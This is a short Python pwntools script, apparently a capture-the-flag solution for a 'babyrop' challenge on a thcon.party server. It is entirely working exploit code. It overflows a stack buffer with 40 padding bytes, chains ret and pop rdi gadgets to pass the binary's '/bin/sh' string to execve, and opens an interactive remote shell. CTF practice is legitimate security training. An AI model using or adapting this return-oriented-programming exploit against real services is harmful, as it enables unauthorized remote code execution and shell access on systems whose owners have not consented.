from pwn import *

elf = ELF('./babyrop')
context.binary = elf
rop = ROP(elf)

#s = process('./babyrop')
s = remote('remote1.thcon.party', 10900)
#s = remote('remote2.thcon.party', 10900)

binsh = next(elf.search(b'/bin/sh\x00'))
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
ret = rop.find_gadget(['ret']).address

offset = 40
payload = b'A' * offset
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(elf.symbols.execve)


s.sendline(payload)
s.interactive()
